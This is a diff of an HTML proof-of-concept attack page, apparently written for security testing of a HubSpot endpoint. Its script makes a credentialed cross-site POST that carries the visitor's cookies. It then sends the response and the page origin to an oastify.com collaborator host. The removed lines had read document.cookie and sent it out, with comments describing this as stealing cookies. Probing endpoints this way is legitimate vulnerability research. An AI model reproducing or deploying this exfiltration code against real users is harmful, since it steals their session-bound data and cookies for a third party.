@@ -6,29 +6,38 @@
 <body>
     <h1>Loading...</h1>
     <script>
-    // This script sends the user's cookies to the attacker's server
+    // This sends the request WITH cookies automatically
     fetch('https://app.hubspot.com/api/usage-logging/v1/log/hublytics-multi/no-auth', {
         method: 'POST',
-        credentials: 'include',  // This sends the cookies!
+        credentials: 'include',  // This sends the cookies automatically!
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify([{
             event: 'page_view',
             properties: {
                 url: window.location.href,
-                cookies: document.cookie,  // This steals the cookies
                 timestamp: new Date().toISOString()
             }
         }])
     })
-    .then(r => r.text())
+    .then(r => {
+        console.log('Status:', r.status);
+        console.log('Headers:', r.headers);
+        return r.text();
+    })
     .then(data => {
-        // Send stolen data to attacker's server
+        // Send the response to attacker's server
         fetch('https://yuwponvu168v1ltzgwpw6spct3zunkb9.oastify.com', {
             method: 'POST',
             mode: 'no-cors',
-            body: JSON.stringify({data: data, cookies: document.cookie})
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                response: data,
+                origin: window.location.origin
+            })
         });
-    });
+        console.log('Data sent to collaborator:', data);
+    })
+    .catch(e => console.log('Error:', e));
     </script>
 </body>
 </html>
